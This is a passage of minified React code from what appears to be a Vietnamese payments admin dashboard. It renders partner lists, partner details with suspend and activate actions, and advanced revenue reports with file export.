text-muted-foreground",children:[e.jsx(ot,{className:"inline h-3 w-3 mr-1"}),"+",v.newThisMonth||0," tháng này"]})]})]}),e.jsxs(k,{children:[e.jsxs(L,{className:"flex flex-row items-center justify-between space-y-0 pb-2",children:[e.jsx(M,{className:"text-sm font-medium",children:"Đang hoạt động"}),e.jsx(Ce,{className:"h-4 w-4 text-muted-foreground"})]}),e.jsxs(_,{children:[e.jsx("div",{className:"text-2xl font-bold",children:v.activePartners||0}),e.jsxs("p",{className:"text-xs text-muted-foreground",children:[v.activePercentage||0,"% của tổng số"]})]})]}),e.jsxs(k,{children:[e.jsxs(L,{className:"flex flex-row items-center justify-between space-y-0 pb-2",children:[e.jsx(M,{className:"text-sm font-medium",children:"Tổng doanh thu"}),e.jsx(kt,{className:"h-4 w-4 text-muted-foreground"})]}),e.jsxs(_,{children:[e.jsxs("div",{className:"text-2xl font-bold",children:["₫",(v.totalRevenue||0).toLocaleString("vi-VN")]}),e.jsxs("p",{className:"text-xs text-muted-foreground",children:[e.jsx(ot,{className:"inline h-3 w-3 mr-1"}),"+",v.revenueGrowth||0,"% so với tháng trước"]})]})]}),e.jsxs(k,{children:[e.jsxs(L,{className:"flex flex-row items-center justify-between space-y-0 pb-2",children:[e.jsx(M,{className:"text-sm font-medium",children:"Tổng giao dịch"}),e.jsx(dt,{className:"h-4 w-4 text-muted-foreground"})]}),e.jsxs(_,{children:[e.jsx("div",{className:"text-2xl font-bold",children:(v.totalTransactions||0).toLocaleString("vi-VN")}),e.jsxs("p",{className:"text-xs text-muted-foreground",children:["Trung bình ",(v.avgTransactionsPerPartner||0).toFixed(0),"/đối tác"]})]})]})]}),e.jsxs(k,{children:[e.jsx(L,{children:e.jsxs(M,{className:"flex items-center gap-2",children:[e.jsx(_t,{className:"h-5 w-5"}),"Bộ lọc và tìm kiếm"]})}),e.jsx(_,{children:e.jsxs("div",{className:"grid gap-4 md:grid-cols-2 lg:grid-cols-5",children:[e.jsxs("div",{className:"relative",children:[e.jsx(He,{className:"absolute left-3 top-3 h-4 w-4 text-muted-foreground"}),e.jsx(se,{placeholder:"Tìm theo tên, email...",className:"pl-9",onChange:u})]}),e.jsxs(ce,{value:s,onValueChange:E=>D("status",E),children:[e.jsx(re,{children:e.jsx(le,{placeholder:"Trạng thái"})}),e.jsxs(ie,{children:[e.jsx(R,{value:"all",children:"Tất cả trạng thái"}),e.jsx(R,{value:"active",children:"Hoạt động"}),e.jsx(R,{value:"inactive",children:"Không hoạt động"}),e.jsx(R,{value:"suspended",children:"Tạm ngừng"})]})]}),e.jsxs(ce,{value:r,onValueChange:E=>D("businessType",E),children:[e.jsx(re,{children:e.jsx(le,{placeholder:"Loại hình"})}),e.jsxs(ie,{children:[e.jsx(R,{value:"all",children:"Tất cả loại hình"}),e.jsx(R,{value:"individual",children:"Cá nhân"}),e.jsx(R,{value:"household",children:"Hộ kinh doanh"}),e.jsx(R,{value:"company",children:"Công ty"}),e.jsx(R,{value:"enterprise",children:"Doanh nghiệp"})]})]}),e.jsxs(ce,{value:c,onValueChange:E=>D("industry",E),children:[e.jsx(re,{children:e.jsx(le,{placeholder:"Ngành nghề"})}),e.jsxs(ie,{children:[e.jsx(R,{value:"all",children:"Tất cả ngành nghề"}),e.jsx(R,{value:"food",children:"Ăn uống"}),e.jsx(R,{value:"retail",children:"Bán lẻ"}),e.jsx(R,{value:"service",children:"Dịch vụ"}),e.jsx(R,{value:"technology",children:"Công nghệ"}),e.jsx(R,{value:"other",children:"Khác"})]})]}),e.jsxs(C,{onClick:j,variant:"outline",className:"w-full",children:[e.jsx(Ee,{className:"h-4 w-4 mr-2"}),"Xuất dữ liệu"]})]})})]}),e.jsxs(k,{children:[e.jsx(L,{children:e.jsx(M,{children:"Danh sách đối tác"})}),e.jsx(_,{children:m?e.jsxs("div",{className:"flex items-center justify-center py-8",children:[e.jsx(ye,{className:"h-6 w-6 animate-spin mr-2"}),e.jsx("span",{children:"Đang tải..."})]}):e.jsxs(e.Fragment,{children:[e.jsxs(Me,{children:[e.jsx(Pe,{children:e.jsxs(he,{children:[e.jsx(K,{children:"Doanh nghiệp"}),e.jsx(K,{children:"Liên hệ"}),e.jsx(K,{children:"Loại hình"}),e.jsx(K,{children:"Ngành nghề"}),e.jsx(K,{children:"Trạng thái"}),e.jsx(K,{children:"Doanh thu"}),e.jsx(K,{children:"Hoạt động cuối"}),e.jsx(K,{className:"text-right",children:"Thao tác"})]})}),e.jsx(De,{children:(T=V==null?void 0:V.items)==null?void 0:T.map(E=>e.jsxs(he,{children:[e.jsx(H,{children:e.jsxs("div",{children:[e.jsx("div",{className:"font-medium",children:E.businessName}),e.jsxs("div",{className:"text-sm text-muted-foreground",children:[e.jsx(sn,{className:"inline h-3 w-3 mr-1"}),E.id]})]})}),e.jsx(H,{children:e.jsxs("div",{children:[e.jsxs("div",{className:"font-medium flex items-center",children:[e.jsx(_e,{className:"h-3 w-3 mr-1"}),E.representativeName]}),e.jsxs("div",{className:"text-sm text-muted-foreground flex items-center",children:[e.jsx(Ke,{className:"h-3 w-3 mr-1"}),E.email]}),e.jsxs("div",{className:"text-sm text-muted-foreground flex items-center",children:[e.jsx(St,{className:"h-3 w-3 mr-1"}),E.phone]})]})}),e.jsx(H,{children:e.jsx($,{variant:"outline",children:J(E.businessType)})}),e.jsx(H,{children:e.jsx($,{variant:"secondary",children:q(E.industry)})}),e.jsx(H,{children:e.jsx($,{className:W(E.status),children:U(E.status)})}),e.jsx(H,{children:e.jsxs("div",{children:[e.jsxs("div",{className:"font-medium",children:["₫",E.totalRevenue.toLocaleString("vi-VN")]}),e.jsxs("div",{className:"text-sm text-muted-foreground",children:[E.totalTransactions," GD"]})]})}),e.jsx(H,{children:e.jsxs("div",{className:"text-sm",children:[e.jsx(Te,{className:"inline h-3 w-3 mr-1"}),ue(E.lastActivity)]})}),e.jsx(H,{className:"text-right",children:e.jsxs(C,{variant:"ghost",size:"sm",onClick:()=>window.location.href=`/partners/${E.id}`,children:[e.jsx($e,{className:"h-4 w-4 mr-2"}),"Chi tiết"]})})]},E.id))})]}),V&&V.total>f&&e.jsxs("div",{className:"flex items-center justify-between px-2 py-4",children:[e.jsxs("div",{className:"flex-1 text-sm text-muted-foreground",children:["Hiển thị ",(l-1)*f+1," đến ",Math.min(l*f,V.total)," trong tổng số ",V.total," đối tác"]}),e.jsxs("div",{className:"flex items-center space-x-6 lg:space-x-8",children:[e.jsxs("div",{className:"flex items-center space-x-2",children:[e.jsx("p",{className:"text-sm font-medium",children:"Hiển thị"}),e.jsxs(ce,{value:f.toString(),onValueChange:E=>G(Number(E)),children:[e.jsx(re,{className:"h-8 w-[70px]",children:e.jsx(le,{})}),e.jsx(ie,{side:"top",children:[10,20,30,40,50].map(E=>e.jsx(R,{value:E.toString(),children:E},E))})]})]}),e.jsxs("div",{className:"flex w-[100px] items-center justify-center text-sm font-medium",children:["Trang ",l," / ",Math.ceil(V.total/f)]}),e.jsxs("div",{className:"flex items-center space-x-2",children:[e.jsx(C,{variant:"outline",size:"sm",onClick:()=>z(l-1),disabled:l===1,children:"Trước"}),e.jsx(C,{variant:"outline",size:"sm",onClick:()=>z(l+1),disabled:l===Math.ceil(V.total/f),children:"Sau"})]})]})]})]})})]})]})},ki=()=>{const{id:n}=Yn(),[,t]=Xe(),{toast:s}=Se(),[a,r]=d.useState(!1),{data:i,isLoading:c,isError:x,refetch:l}=me({queryKey:["partner",n],queryFn:async()=>Q.apiRequest(`/admin/partners/${n}`),enabled:!!n});d.useEffect(()=>{x&&r(!0)},[x]);const y=i,f=async()=>{if(!a&&confirm("Bạn có chắc chắn muốn tạm ngừng đối tác này?"))try{await Q.apiRequest(`/admin/partners/${n}/suspend`,{method:"POST"}),s({title:"Thành công",description:"Đã tạm ngừng đối tác."}),l()}catch{s({title:"Lỗi",description:"Không thể tạm ngừng đối tác.",variant:"destructive"})}},b=async()=>{if(!a)try{await Q.apiRequest(`/admin/partners/${n}/activate`,{method:"POST"}),s({title:"Thành công",description:"Đã kích hoạt đối tác."}),l()}catch{s({title:"Lỗi",description:"Không thể kích hoạt đối tác.",variant:"destructive"})}},o=m=>{switch(m){case"active":return"bg-green-100 text-green-800";case"inactive":return"bg-gray-100 text-gray-800";case"suspended":return"bg-red-100 text-red-800";case"verified":return"bg-blue-100 text-blue-800";case"pending":return"bg-yellow-100 text-yellow-800";default:return"bg-gray-100 text-gray-800"}},p=m=>{switch(m){case"active":return"Hoạt động";case"inactive":return"Không hoạt động";case"suspended":return"Tạm ngừng";case"verified":return"Đã xác minh";case"pending":return"Đang chờ";default:return m}},g=m=>{switch(m){case"individual":return"Cá nhân";case"household":return"Hộ kinh doanh";case"company":return"Công ty";case"enterprise":return"Doanh nghiệp";default:return m}},h=m=>{switch(m){case"food":return"Ăn uống";case"retail":return"Bán lẻ";case"service":return"Dịch vụ";case"technology":return"Công nghệ";case"other":return"Khác";default:return m}};return c?e.jsxs("div",{className:"flex items-center justify-center py-8",children:[e.jsx(ye,{className:"h-6 w-6 animate-spin mr-2"}),e.jsx("span",{children:"Đang tải..."})]}):y?e.jsxs("div",{className:"space-y-6",children:[a&&e.jsxs("div",{className:"bg-yellow-50 border border-yellow-200 rounded-md p-4",children:[e.jsx("p",{className:"text-yellow-800 font-medium",children:"Tính năng chưa khả dụng"}),e.jsx("p",{className:"text-yellow-700 text-sm mt-1",children:"Backend chưa cung cấp endpoints /admin/partners/* cho chi tiết hoặc thao tác. Các nút hành động đã được vô hiệu hoá."})]}),e.jsxs("div",{className:"flex items-center justify-between",children:[e.jsxs("div",{className:"flex items-center space-x-4",children:[e.jsxs(C,{variant:"ghost",size:"sm",onClick:()=>t("/partners"),children:[e.jsx(ts,{className:"h-4 w-4 mr-2"}),"Quay lại"]}),e.jsxs("div",{children:[e.jsx("h1",{className:"text-3xl font-bold tracking-tight",children:y.businessName}),e.jsxs("p",{className:"text-muted-foreground",children:["ID: ",y.id]})]})]}),e.jsx("div",{className:"flex space-x-2",children:y.status==="active"?e.jsxs(C,{variant:"destructive",size:"sm",onClick:f,disabled:a,children:[e.jsx(ca,{className:"h-4 w-4 mr-2"}),"Tạm ngừng"]}):e.jsxs(C,{variant:"default",size:"sm",onClick:b,disabled:a,children:[e.jsx(ge,{className:"h-4 w-4 mr-2"}),"Kích hoạt"]})})]}),e.jsxs("div",{className:"grid gap-4 md:grid-cols-2 lg:grid-cols-4",children:[e.jsxs(k,{children:[e.jsx(L,{className:"flex flex-row items-center justify-between space-y-0 pb-2",children:e.jsx(M,{className:"text-sm font-medium",children:"Trạng thái"})}),e.jsx(_,{children:e.jsx($,{className:o(y.status),children:p(y.status)})})]}),e.jsxs(k,{children:[e.jsxs(L,{className:"flex flex-row items-center justify-between space-y-0 pb-2",children:[e.jsx(M,{className:"text-sm font-medium",children:"Tổng doanh thu"}),e.jsx(kt,{className:"h-4 w-4 text-muted-foreground"})]}),e.jsx(_,{children:e.jsxs("div",{className:"text-2xl font-bold",children:["₫",y.stats.totalRevenue.toLocaleString("vi-VN")]})})]}),e.jsxs(k,{children:[e.jsxs(L,{className:"flex flex-row items-center justify-between space-y-0 pb-2",children:[e.jsx(M,{className:"text-sm font-medium",children:"Tổng giao dịch"}),e.jsx(Ce,{className:"h-4 w-4 text-muted-foreground"})]}),e.jsx(_,{children:e.jsx("div",{className:"text-2xl font-bold",children:y.stats.totalTransactions.toLocaleString("vi-VN")})})]}),e.jsxs(k,{children:[e.jsxs(L,{className:"flex flex-row items-center justify-between space-y-0 pb-2",children:[e.jsx(M,{className:"text-sm font-medium",children:"Giá trị TB"}),e.jsx(dt,{className:"h-4 w-4 text-muted-foreground"})]}),e.jsx(_,{children:e.jsxs("div",{className:"text-2xl font-bold",children:["₫",y.stats.avgTransactionValue.toLocaleString("vi-VN")]})})]})]}),e.jsxs("div",{className:"grid gap-6 md:grid-cols-2",children:[e.jsxs(k,{children:[e.jsx(L,{children:e.jsx(M,{children:"Thông tin doanh nghiệp"})}),e.jsxs(_,{className:"space-y-4",children:[e.jsxs("div",{className:"grid grid-cols-2 gap-4",children:[e.jsxs("div",{children:[e.jsx("label",{className:"text-sm font-medium text-muted-foreground",children:"Tên doanh nghiệp"}),e.jsx("p",{className:"font-medium",children:y.businessName})]}),e.jsxs("div",{children:[e.jsx("label",{className:"text-sm font-medium text-muted-foreground",children:"Người đại diện"}),e.jsx("p",{className:"font-medium",children:y.representativeName})]}),e.jsxs("div",{children:[e.jsx("label",{className:"text-sm font-medium text-muted-foreground",children:"Loại hình"}),e.jsx("p",{children:g(y.businessType)})]}),e.jsxs("div",{children:[e.jsx("label",{className:"text-sm font-medium text-muted-foreground",children:"Ngành nghề"}),e.jsx("p",{children:h(y.industry)})]})]}),e.jsxs("div",{children:[e.jsx("label",{className:"text-sm font-medium text-muted-foreground",children:"Địa chỉ"}),e.jsxs("p",{className:"flex items-start",children:[e.jsx(pa,{className:"h-4 w-4 mr-2 mt-0.5 text-muted-foreground"}),y.address]})]}),e.jsxs("div",{children:[e.jsx("label",{className:"text-sm font-medium text-muted-foreground",children:"Ngày đăng ký"}),e.jsxs("p",{className:"flex items-center",children:[e.jsx(Te,{className:"h-4 w-4 mr-2 text-muted-foreground"}),ue(y.registrationDate)]})]})]})]}),e.jsxs(k,{children:[e.jsx(L,{children:e.jsx(M,{children:"Thông tin liên hệ"})}),e.jsxs(_,{className:"space-y-4",children:[e.jsxs("div",{children:[e.jsx("label",{className:"text-sm font-medium text-muted-foreground",children:"Email"}),e.jsxs("p",{className:"flex items-center",children:[e.jsx(Ke,{className:"h-4 w-4 mr-2 text-muted-foreground"}),y.email]})]}),e.jsxs("div",{children:[e.jsx("label",{className:"text-sm font-medium text-muted-foreground",children:"Số điện thoại"}),e.jsxs("p",{className:"flex items-center",children:[e.jsx(St,{className:"h-4 w-4 mr-2 text-muted-foreground"}),y.phone]})]}),e.jsxs("div",{children:[e.jsx("label",{className:"text-sm font-medium text-muted-foreground",children:"Trạng thái xác minh"}),e.jsx("div",{className:"mt-1",children:e.jsx($,{className:o(y.verificationStatus),children:p(y.verificationStatus)})})]})]})]}),e.jsxs(k,{children:[e.jsx(L,{children:e.jsx(M,{children:"Tài khoản ngân hàng"})}),e.jsxs(_,{className:"space-y-4",children:[e.jsxs("div",{children:[e.jsx("label",{className:"text-sm font-medium text-muted-foreground",children:"Ngân hàng"}),e.jsx("p",{className:"font-medium",children:y.bankAccount.bankName})]}),e.jsxs("div",{children:[e.jsx("label",{className:"text-sm font-medium text-muted-foreground",children:"Số tài khoản"}),e.jsx("p",{className:"font-mono",children:y.bankAccount.accountNumber})]}),e.jsxs("div",{children:[e.jsx("label",{className:"text-sm font-medium text-muted-foreground",children:"Chủ tài khoản"}),e.jsx("p",{children:y.bankAccount.accountHolder})]}),e.jsxs("div",{children:[e.jsx("label",{className:"text-sm font-medium text-muted-foreground",children:"Chi nhánh"}),e.jsx("p",{children:y.bankAccount.branch})]}),e.jsxs("div",{children:[e.jsx("label",{className:"text-sm font-medium text-muted-foreground",children:"Trạng thái"}),e.jsx("div",{className:"mt-1",children:e.jsx($,{className:o(y.bankAccount.verified?"verified":"pending"),children:y.bankAccount.verified?"Đã xác minh":"Chờ xác minh"})})]})]})]}),e.jsxs(k,{children:[e.jsx(L,{children:e.jsx(M,{children:"Giấy phép kinh doanh"})}),e.jsxs(_,{className:"space-y-4",children:[e.jsxs("div",{children:[e.jsx("label",{className:"text-sm font-medium text-muted-foreground",children:"Số giấy phép"}),e.jsx("p",{className:"font-mono",children:y.businessLicense.number})]}),e.jsxs("div",{className:"grid grid-cols-2 gap-4",children:[e.jsxs("div",{children:[e.jsx("label",{className:"text-sm font-medium text-muted-foreground",children:"Ngày cấp"}),e.jsx("p",{children:ue(y.businessLicense.issuedDate)})]}),e.jsxs("div",{children:[e.jsx("label",{className:"text-sm font-medium text-muted-foreground",children:"Ngày hết hạn"}),e.jsx("p",{children:ue(y.businessLicense.expiryDate)})]})]}),e.jsxs("div",{children:[e.jsx("label",{className:"text-sm font-medium text-muted-foreground",children:"Nơi cấp"}),e.jsx("p",{children:y.businessLicense.issuedBy})]})]})]})]}),e.jsxs(k,{children:[e.jsx(L,{children:e.jsx(M,{children:"Tài liệu đã tải lên"})}),e.jsx(_,{children:e.jsxs(Me,{children:[e.jsx(Pe,{children:e.jsxs(he,{children:[e.jsx(K,{children:"Tên tài liệu"}),e.jsx(K,{children:"Loại"}),e.jsx(K,{children:"Ngày tải lên"}),e.jsx(K,{children:"Trạng thái"}),e.jsx(K,{className:"text-right",children:"Thao tác"})]})}),e.jsx(De,{children:y.documents.map(m=>e.jsxs(he,{children:[e.jsx(H,{children:m.name}),e.jsx(H,{children:e.jsx($,{variant:"outline",children:m.type})}),e.jsx(H,{children:ue(m.uploadedAt)}),e.jsx(H,{children:e.jsx($,{className:o(m.status),children:p(m.status)})}),e.jsx(H,{className:"text-right",children:e.jsx(C,{variant:"ghost",size:"sm",asChild:!0,children:e.jsxs("a",{href:m.url,target:"_blank",rel:"noopener noreferrer",children:[e.jsx(Ue,{className:"h-4 w-4 mr-2"}),"Xem"]})})})]},m.id))})]})})]}),e.jsxs(k,{children:[e.jsx(L,{children:e.jsx(M,{children:"Giao dịch gần đây"})}),e.jsx(_,{children:e.jsxs(Me,{children:[e.jsx(Pe,{children:e.jsxs(he,{children:[e.jsx(K,{children:"Mã giao dịch"}),e.jsx(K,{children:"Số tiền"}),e.jsx(K,{children:"Mô tả"}),e.jsx(K,{children:"Trạng thái"}),e.jsx(K,{children:"Thời gian"})]})}),e.jsx(De,{children:y.recentTransactions.slice(0,10).map(m=>e.jsxs(he,{children:[e.jsx(H,{className:"font-mono text-sm",children:m.id}),e.jsxs(H,{className:"font-medium",children:["₫",m.amount.toLocaleString("vi-VN")]}),e.jsx(H,{children:m.description}),e.jsx(H,{children:e.jsx($,{className:o(m.status),children:p(m.status)})}),e.jsx(H,{children:ue(m.createdAt)})]},m.id))})]})})]})]}):e.jsxs("div",{className:"text-center py-8",children:[e.jsx("p",{children:"Không tìm thấy thông tin đối tác."}),e.jsx(C,{onClick:()=>t("/partners"),className:"mt-4",children:"Quay lại danh sách"})]})},_i=()=>{const[n,t]=d.useState("30d"),[s,a]=d.useState("overview"),[r,i]=d.useState(!1),{toast:c}=Se(),{data:x,isLoading:l,isError:y,refetch:f}=me({queryKey:["advanced-reports",n,s],queryFn:async()=>{const h=new URLSearchParams({timeRange:n,type:s});return Q.apiRequest(`/admin/reports/advanced?${h}`)},staleTime:3e5});d.useEffect(()=>{y&&i(!0)},[y]);const b=x,o=async(h="excel")=>{try{if(r)return;const m=await Q.apiRequest("/admin/reports/export",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({timeRange:n,reportType:s,format:h})}),B=new Blob([m],{type:h==="pdf"?"application/pdf":h==="csv"?"text/csv":"application/vnd.openxmlformats-officedocument.spreadsheetml.sheet"}),P=window.URL.createObjectURL(B),S=document.createElement("a");S.href=P,S.download=`advanced-report-${n}-${new Date().toISOString().split("T")[0]}.${h}`,document.body.appendChild(S),S.click(),window.URL.revokeObjectURL(P),document.body.removeChild(S),c({title:"Xuất báo cáo thành công",description:`File ${h.toUpperCase()} đã được tải xuống.`})}catch{c({title:"Lỗi xuất báo cáo",description:"Không thể xuất báo cáo. Vui lòng thử lại.",variant:"destructive"})}},p=h=>new Intl.NumberFormat("vi-VN",{style:"currency",currency:"VND"}).format(h),g=h=>{const m=h>=0;return e.jsxs($,{variant:m?"default":"destructive",className:"ml-2",children:[e.jsx(ot,{className:`h-3 w-3 mr-1 ${m?"":"rotate-180"}`}),Math.abs(h).toFixed(1),"%"]})};return l?e.jsxs("div",{className:"flex items-center justify-center py-8",children:[e.jsx(ye,{className:"h-6 w-6 animate-spin mr-2"}),e.jsx("span",{children:"Đang tải dữ liệu báo cáo..."})]}):e.jsxs("div",{className:"space-y-6",children:[r&&e.jsxs("div",{className:"bg-yellow-50 border border-yellow-200 rounded-md p-4",children:[e.jsx("p",{className:"text-yellow-800 font-medium",children:"Báo cáo nâng cao chưa khả dụng"}),e.jsx("p",{className:"text-yellow-700 text-sm mt-1",children:"Backend chưa cung cấp các endpoints /admin/reports/advanced và /admin/reports/export. Các nút xuất báo cáo đã bị vô hiệu hoá."})]}),e.jsxs("div",{className:"flex items-center justify-between",children:[e.jsxs("div",{children:[e.jsx("h1",{className:"text-3xl font-bold tracking-tight",children:"Báo cáo nâng cao"}),e.jsx("p",{className:"text-muted-foreground",children:"Phân tích chi tiết và thống kê nâng cao về hệ thống"})]}),e.jsxs("div",{className:"flex space-x-2",children:[e.jsxs(C,{onClick:()=>f(),variant:"outline",size:"sm",children:[e.jsx(ye,{className:"h-4 w-4 mr-2"}),"Làm mới"]}),e.jsxs(C,{onClick:()=>o("excel"),variant:"outline",size:"sm",disabled:r,"aria-disabled":r,children:[e.jsx(Ee,{className:"h-4 w-4 mr-2"}),"Xuất Excel"]}),e.jsxs(C,{onClick:()=>o("pdf"),variant:"outline",size:"sm",disabled:r,"aria-disabled":r,children:[e.jsx(Ee,{className:"h-4 w-4 mr-2"}),"Xuất PDF"]})]})]}),e.jsxs(k,{children:[e.jsx(L,{children:e.jsxs(M,{className:"flex items-center gap-2",children:[e.jsx(_t,{className:"h-5 w-5"}),"Bộ lọc báo cáo"]})}),e.jsx(_,{children:e.jsxs("div",{className:"grid gap-4 md:grid-cols-2 lg:grid-cols-4",children:[e.jsxs("div",{children:[e.jsx("label",{className:"text-sm font-medium mb-2 block",children:"Khoảng thời gian"}),e.jsxs(ce,{value:n,onValueChange:t,children:[e.jsx(re,{children:e.jsx(le,{})}),e.jsxs(ie,{children:[e.jsx(R,{value:"7d",children:"7 ngày"}),e.jsx(R,{value:"30d",children:"30 ngày"}),e.jsx(R,{value:"90d",children:"90 ngày"}),e.jsx(R,{value:"1y",children:"1 năm"}),e.jsx(R,{value:"custom",children:"Tùy chỉnh"})]})]})]}),e.jsxs("div",{children:[e.jsx("label",{className:"text-sm font-medium mb-2 block",children:"Loại báo cáo"}),e.jsxs(ce,{value:s,onValueChange:a,children:[e.jsx(re,{children:e.jsx(le,{})}),e.jsxs(ie,{children:[e.jsx(R,{value:"overview",children:"Tổng quan"}),e.jsx(R,{value:"revenue",children:"Doanh thu"}),e.jsx(R,{value:"transactions",children:"Giao dịch"}),e.jsx(R,{value:"partners",children:"Đối tác"}),e.jsx(R,{value:"trends",children:"Xu hướng"})]})]})]})]})})]}),b&&e.jsxs(e.Fragment,{children:[e.jsxs("div",{className:"grid gap-4 md:grid-cols-2 lg:grid-cols-4",children:[e.jsxs(k,{children:[e.jsxs(L,{className:"flex flex-row items-center justify-between space-y-0 pb-2",children:[e.jsx(M,{className:"text-sm font-medium",children:"Tổng doanh thu"}),e.jsx(kt,{className:"h-4 w-4 text-muted-foreground"})]}),e.jsxs(_,{children:[e.jsx("div",{className:"text-2xl font-bold",children:p(b.overview.totalRevenue)}),e.jsxs("div",{className:"flex items-center text-xs text-muted-foreground",children:[e.jsx("span",{children:"So với kỳ trước"}),g(b.overview.growth.revenue)]})]})]}),e.jsxs(k,{children:[e.jsxs(L,{className:"flex flex-row items-center justify-between space-y-0 pb-2",children:[e.jsx(M,{className:"text-sm font-medium",children:"Tổng giao dịch"}),e.jsx(dt,{className:"h-4 w-4 text-muted-foreground"})]}),e.jsxs(_,{children:[e.jsx("div",{className:"text-2xl font-bold",children:b.overview.totalTransactions.toLocaleString("vi-VN")}),e.jsxs("div",{className:"flex items-center text-xs text-muted-foreground",children:[e.jsx("span",{children:"So với kỳ trước"}),g(b.overview.growth.transactions)]})]})]}),e.jsxs(k,{children:[e.jsxs(L,{className:"flex flex-row items-center justify-between space-y-0 pb-2",children:[e.jsx(M,{className:"text-sm font-medium",children:"Số đối tác"}),e.jsx(Ve,{className:"h-4 w-4 text-muted-foreground"})]}),e.jsxs(_,{children:[e.jsx("div",{className:"text-2xl font-bold",children:b.overview.totalPartners.toLocaleString("vi-VN")}),e.jsxs("div",{className:"flex items-center text-xs text-muted-foreground",children:[e.jsx("span",{children:"So với kỳ trước"}),g(b.overview.growth.partners)]})]})]}),e.jsxs(k,{children:[e.jsxs(L,{className:"flex flex-row items-center justify-between space-y-0 pb-2",children:[e.jsx(M,{className:"text-sm font-medium",children:"Số người dùng"}),e.jsx(Ce,{className:"h-4 w-4 text-muted-foreground"})]}),e.jsxs(_,{children:[e.jsx("div",{className:"text-2xl font-bold",children:b.overview.totalUsers.toLocaleString("vi-VN")}),e.jsxs("div",{className:"flex items-center text-xs text-muted-foreground",children:[e.jsx("span",{children:"So với kỳ trước"}),g(b.overview.growth.users)]})]})]})]}),s==="overview"||s==="revenue"?e.jsxs("div",{className:"grid gap-6 md:grid-cols-2",children:[e.jsxs(k,{children:[e.jsx(L,{children:e.jsx(M,{children:"Doanh thu theo phương thức thanh toán"})}),e.jsx(_,{children:e.jsx("div",{className:"space-y-3",children:b.revenue.byPaymentMethod.map((h,m)=>e.jsxs("div",{className:"flex items-center justify-between",children:[e.jsxs("div",{className:"flex items-center space-x-2",children:[e.jsx("div",{className:"w-3 h-3 rounded-full",style:{backgroundColor:`hsl(${m*45}, 70%, 50%)`}}),e.jsx("span",{className:"text-sm",children:h.method})]}),e.jsxs("div",{className:"text-right",children:[e.jsx("div",{className:"font-medium",children:p(h.amount)}),e.jsxs("div",{className:"text-xs text-muted-foreground",children:[h.percentage,"%"]})]})]},h.method))})})]}),e.jsxs(k,{children:[e.jsx(L,{children:e.jsx(M,{children:"Top 5 đối tác theo doanh thu"})}),e.jsx(_,{children:e.jsx("div",{className:"space-y-3",children:b.revenue.byPartner.slice(0,5).map((h,m)=>e.jsxs("div",{className:"flex items-center justify-between",children:[e.jsxs("div",{className:"flex items-center space-x-2",children:[e.jsx($,{variant:"outline",className:"w-6 h-6 p-0 flex items-center justify-center text-xs",children:m+1}),e.jsx("span",{className:"text-sm font-medium",children:h.partnerName})]}),e.jsx("div",{className:"font-medium text-green-600",children:p(h.amount)})]},h.partnerId))})})]})]}):null,s==="overview"||s==="transactions"?e.jsxs("div",{className:"grid gap-6 md:grid-cols-2",children:[e.jsxs(k,{children:[e.jsx(L,{children:e.jsx(M,{children:"Giao dịch theo trạng thái"})}),e.jsx(_,{children:e.jsx("div",{className:"space-y-3",children:b.transactions.byStatus.map(h=>e.jsxs("div",{className:"flex items-center justify-between",children:[e.jsx("div",{className:"flex items-center space-x-2",children:e.jsx($,{variant:h.status==="success"?"default":h.status==="pending"?"secondary":"destructive",className:"text-xs",children:h.status==="success"?"Thành công":h.status==="pending"?"Đang xử lý":"Thất bại"})}),e.jsxs("div",{className:"text-right",children:[e.jsx("div",{className:"font-medium",children:h.count.toLocaleString("vi-VN")}),e.jsxs("div",{className:"text-xs text-muted-foreground",children:[h.percentage,"%"]})]})]},h.status))})})]}),e.jsxs(k,{children:[e.jsx(L,{children:e.jsx(M,{children:"Giờ cao điểm"})}),e.jsx(_,{children:e.jsx("div",{className:"space-y-2",children:b.transactions.peakHours.slice(0,5).map(h=>e.jsxs("div",{className:"flex items-center justify-between",children:[e.jsxs("div",{className:"flex items-center space-x-2",children:[e.jsx(rn,{className:"h-4 w-4 text-muted-foreground"}),e.jsxs("span",{className:"text-sm",children:[h.hour,":00 - ",h.hour+1,":00"]})]}),e.jsxs($,{variant:"outline",children:[h.count," giao dịch"]})]},h.hour))})})]})]}):null,s==="overview"||s==="partners"?e.jsxs("div",{className:"grid gap-6 md:grid-cols-2",children:[e.jsxs(k,{children:[e.jsx(L,{children:e.jsx(M,{children:"Đối tác theo ngành nghề"})}),e.jsx(_,{children:e.jsx("div",{className:"space-y-3",children:b.partners.byIndustry.map(h=>e.jsxs("div",{className:"flex items-center justify-between",children:[e.jsxs("div",{children:[e.jsx("div",{className:"font-medium",children:h.industry}),e.jsxs("div",{className:"text-sm text-muted-foreground",children:[h.count," đối tác"]})]}),e.jsx("div",{className:"text-right",children:e.jsx("div",{className:"font-medium",children:p(h.revenue)})})]},h.industry))})})]}),e.jsxs(k,{children:[e.jsx(L,{children:e.jsx(M,{children:"Hiệu suất đối tác"})}),e.jsx(_,{children:e.jsx("div",{className:"space-y-3",children:b.partners.performance.slice(0,5).map((h,m)=>e.jsxs("div",{className:"border-b pb-3 last:border-b-0",children:[e.jsxs("div",{className:"flex items-center justify-between mb-1",children:[e.jsx("span",{className:"font-medium text-sm",children:h.partnerName}),e.jsxs($,{variant:"outline",className:"text-xs",children:["#",m+1]})]}),e.jsxs("div",{className:"grid grid-cols-3 gap-2 text-xs text-muted-foreground",children:[e.jsxs("div",{children:[e.jsx("div",{className:"font-medium text-foreground",children:h.transactions}),e.jsx("div",{children:"Giao dịch"})]}),e.jsxs("div",{children:[e.jsx("div",{className:"font-medium text-foreground",children:p(h.revenue)}),e.jsx("div",{children:"Doanh thu"})]}),e.jsxs("div",{children:[e.jsx("div",{className:"font-medium text-foreground",children:p(h.avgTransaction)}),e.jsx("div",{children:"TB/GD"})]})]})]},h.partnerId))})})]})]}):null,s==="overview"||s==="trends"?e.jsxs(k,{children:[e.jsx(L,{children:e.jsx(M,{children:"Xu hướng theo thời gian"})}),e.jsx(_,{children:e.jsxs("div",{className:"grid gap-6 md:grid-cols-3",children:[e.jsxs("div",{children:[e.jsx("h4",{className:"font-medium mb-3",children:"Theo ngày"}),e.jsx("div",{className:"space-y-2",children:b.trends.daily.slice(-7).map(h=>e.jsxs("div",{className:"flex justify-between text-sm",children:[e.jsx("span",{children:ue(h.date)}),e.jsxs("span",{className:"font-medium",children:[p(h.revenue)," (",h.transactions," GD)"]})]},h.date))})]}),e.jsxs("div",{children:[e.jsx("h4",{className:"font-medium mb-3",children:"Theo 